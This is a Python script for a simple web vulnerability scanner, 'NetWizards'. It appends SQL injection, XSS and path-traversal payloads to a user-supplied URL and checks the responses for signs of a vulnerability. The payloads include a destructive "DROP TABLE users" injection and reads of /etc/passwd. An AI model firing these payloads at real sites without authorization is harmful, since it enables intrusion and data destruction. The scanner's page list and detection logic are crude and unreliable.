import requests
import time
import os
from urllib.parse import urlparse

# ASCII Art Logo
logo = """
 ███╗   ██╗███████╗████████╗██╗    ██╗██╗███████╗███████╗
 ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██║██╔════╝██╔════╝
 ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║███████╗███████╗
 ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║╚════██║╚════██║
 ██║ ╚████║███████╗   ██║   ╚███╔███╔╝██║███████║███████║
 ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝
--------------------------------------------------------
             ✦ NetWizards Web Vulnerability Scanner ✦
--------------------------------------------------------
            Created by CSEB Team
--------------------------------------------------------
"""

# Function to print the logo and menu
def print_logo():
    print(logo)

# Function to fetch all pages of a website
def get_all_pages(url):
    # This is a simplified function. In real scenarios, you would use a sitemap or crawl the site.
    pages = []
    base_url = urlparse(url).netloc
    pages.append(url)  # Add the main page
    pages.append(f"{url}/page1")
    pages.append(f"{url}/page2")
    pages.append(f"{url}/page3")
    return pages

# Function to scan for vulnerabilities on a specific page
def scan_page(url):
    print(f"\n  [*] Scanning page: {url}")
    
    # Testing for SQL Injection
    print("  [*] Testing for SQL Injection...")
    sql_payloads = ["'", "' OR '1'='1", "' OR '1'='1' -- ", "'; DROP TABLE users; --"]
    for payload in sql_payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if "SQL syntax" in response.text or "mysql_fetch" in response.text:
                print(f"  [+] SQL Injection Vulnerability Found: {test_url}")
                break
        except requests.exceptions.RequestException as e:
            print(f"  [-] Error while testing SQLi: {e}")
    
    # Testing for XSS
    print("  [*] Testing for XSS...")
    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    for payload in xss_payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if payload in response.text:
                print(f"  [+] XSS Vulnerability Found: {test_url}")
                break
        except requests.exceptions.RequestException as e:
            print(f"  [-] Error while testing XSS: {e}")
    
    # Testing for LFI
    print("  [*] Testing for LFI...")
    lfi_payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
    for payload in lfi_payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if "root:x:" in response.text or "for 16-bit app support" in response.text:
                print(f"  [+] LFI Vulnerability Found: {test_url}")
                break
        except requests.exceptions.RequestException as e:
            print(f"  [-] Error while testing LFI: {e}")
    
    # Checking for CSRF Vulnerability (Basic)
    print("  [*] Checking for CSRF Vulnerability...")
    try:
        response = requests.get(url)
        if "csrf" not in response.text.lower():
            print(f"  [+] CSRF Vulnerability Detected (No CSRF Token Found) at: {url}")
        else:
            print("  [-] CSRF Protection Found.")
    except requests.exceptions.RequestException as e:
        print(f"  [-] Error while testing CSRF: {e}")

# Main function to run the program
def menu():
    print_logo()
    url = input("  [+] Enter target website URL: ")

    # Fetch all pages of the website
    pages = get_all_pages(url)
    
    # Show options to choose from
    while True:
        print("\n  [+] Scan again? [y/n]")
        choice = input("  [+] Enter your choice: ").lower()
        if choice == 'n':
            break
        elif choice == 'y':
            for page in pages:
                scan_page(page)
        else:
            print("  [-] Invalid choice! Please type 'y' or 'n'.")

# Run the tool
if __name__ == "__main__":
    menu()